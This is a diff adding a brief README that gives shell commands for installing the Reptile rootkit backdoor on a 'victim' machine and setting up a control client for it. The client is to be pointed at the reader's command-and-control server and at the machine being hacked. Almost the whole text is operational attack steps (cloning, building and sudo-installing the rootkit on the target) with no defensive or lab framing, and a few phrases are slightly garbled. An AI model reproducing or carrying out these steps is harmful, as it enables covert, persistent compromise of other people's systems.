@@ -1,0 +1,26 @@
+Follow my screenshots to install the reptile backdoor on the victim.
+
+Essentially it is :
+
+#### Victim machine
+
+sudo apt install git libreadline-dev build-essential libncurses-dev linux-headers-$(uname -r)
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+make menuconfig
+#accept all the default options
+make
+sudo make install
+
+
+#### Control machine
+
+Essentially the same as above, but:
+
+sudo apt install git libreadline-dev build-essential libncurses-dev linux-headers-$(uname -r)
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+make client
+
+Then run the client and `load settings.txt` (also in this repo)
+Should not any any new lines to settings file, only change the first ip to ip of your cc server and the other 144ip to the address of the one you are hacking.
